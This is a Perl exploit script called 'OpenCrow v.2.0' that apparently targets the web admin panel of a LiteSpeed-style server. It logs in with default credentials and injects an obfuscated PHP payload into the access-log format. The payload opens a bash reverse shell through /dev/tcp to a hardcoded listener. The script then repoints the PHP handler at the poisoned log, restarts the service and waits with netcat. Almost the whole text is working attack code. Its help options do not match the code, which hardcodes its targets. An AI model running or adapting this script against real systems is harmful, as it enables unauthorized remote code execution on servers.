#!/usr/bin/perl
use strict;
use warnings;
use Path::Tiny;
use Getopt::Long;
use feature qw(say);

say <<help;

 o-o             o-o
o   o           /
|   |o-o o-oo-oO    o-oo   o   o
o   o|  ||-'|  | ||   | | || / || /
 o-o O-o o-oo  o o-oo-o  o   o
     |
     o

+ OpenCrow v.2.0
---------------------------------------------------------------------------

Options :

-l,   --lhost         The listen address
-p,   --lport         The listen port | reverse-shell
-r,   --rhost         The target address range or CIDR identifier
-P,   --rport         The target port (TCP)
-v,   --vport         HTTP server virtual port (this value must be different from LPORT)
-u,   --username      The username to authenticate with.
-x,   --password      The password to authenticate with.

Example : ./suncrow3.sh -l 192.168.1.1 -p 4444 -r 192.168.1.2 -P 7080 -v 5555 -u admin -x admin\n

help

my @set = ('0' ..'9', 'A' .. 'F', 'a'.. 'z');
my $rand = join '' => map $set[rand @set], 1 .. 9;
my $random_log = "$rand".".txt";

# Exploit

use HTTP::Cookies;
use LWP::UserAgent;
use IO::Socket::SSL;

my $ua = LWP::UserAgent->new(
    'send_te' => '0',
    'cookie_jar' => HTTP::Cookies->new());

# [ Options ] Debug with Proxy

# $ua->no_proxy('localhost', 'example.com');
$ua->no_proxy( my @domains );

$ua->ssl_opts(
    SSL_verify_mode => IO::Socket::SSL::SSL_VERIFY_NONE,
    SSL_hostname => '',
    verify_hostname => 0

);

my @_headers = (
    'Accept' => '*/*',
    'Accept-Encoding' => 'gzip,x-gzip,deflate,x-bzip2,bzip2',
    'Accept-Language' => 'en-GB,en-US',
    'Host' => '192.168.1.5:7080',
    'Content-Type'   => 'application/x-www-form-urlencoded'
);

sub _req0(){

    my $req0 = HTTP::Request->new(
    'GET' => 'https://192.168.1.5:7080/service/restart.html',
    [@_headers],
    "{}");
}

sub _req1(){

    my $req = HTTP::Request->new(
    'POST' => 'https://192.168.1.5:7080/login.php',
    [@_headers],
    "userid=admin&pass=admin123");
}

sub _req2(){

    my $req2 = HTTP::Request->new(
    'POST' => 'https://192.168.1.5:7080/config/confMgr.php?m=serv&p=ext',
    [@_headers],
    "{}");
}

my $req1 = $ua->request(_req1,);

my $req2 = $ua->request(_req2,)-> as_string();

my $re=($req2 =~ m/<input type="hidden" name="t" value=""><input type="hidden" name="r" value=""><input type="hidden" name="tk" value="([\d \.]+)">/);

sub _req3(){

    my $req3 = HTTP::Request->new(
    'POST' => 'https://192.168.1.5:7080/config/confMgr.php?m=serv&p=ext',
    [@_headers],
    "useServer=0&fileName=/dev/shm/$random_log&pipedLogger=&logFormat=%25s%3B%3C%3Fphp+exec%28%22%2F%3F%3F%3F%2Fb%3Fs%3F+-c+%27%2F%3F%3F%3F%2Fb%3Fs%3F+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.1.21%2F3232+0%3E%261%27%22%29%3B+%3F%3E&rollingSize=10M&keepDays=90&bytesLog=&compressArchive=&a=s&m=admin&p=general&t=VH_ACLOG&r=&tk=$1&file_create=");
}

my $req3 = $ua->request(_req3,);

sub _req4(){

    my $req4 = HTTP::Request->new(
    'POST' => 'https://192.168.1.5:7080/service/serviceMgr.php',
    [@_headers],
    "act=restart&actId=&vl=&tk=$1");
}

sub _reload(){
    my $req4 = $ua->request(_req4,);

    say "Attacking !!!! ";

    sleep(5.5);

    my $req0 = $ua->request(_req0,);
}

_reload(); _reload();

sub _req6(){

    my $req6 = HTTP::Request->new(
    'POST' => 'https://192.168.1.5:7080/config/confMgr.php',
    [@_headers],
    "name=lsphp5&address=uds%3A%2F%2Ftmp%2Flshttpd%2Flsphp5.sock&note=&maxConns=35&env=PHP_LSAPI_CHILDREN%3D35&initTimeout=60&retryTimeout=0&persistConn=1&pcKeepAliveTimeout=&respBuffer=0&autoStart=3&path=%24SERVER_ROOT%2Ffcgi-bin%2Flsphp5+%2Fdev%2Fshm%2F$random_log&backlog=100&instances=1&extUser=&extGroup=&umask=&runOnStartUp=2&extMaxIdleTime=&priority=0&memSoftLimit=2047M&memHardLimit=2047M&procSoftLimit=400&procHardLimit=500&a=s&m=serv&p=ext&t=A_EXT_LSAPI&r=lsphp5&tk=$1&file_create=");
}

my $req6 = $ua->request(_req6,);

_reload();

system('nc -nvlp 3232');
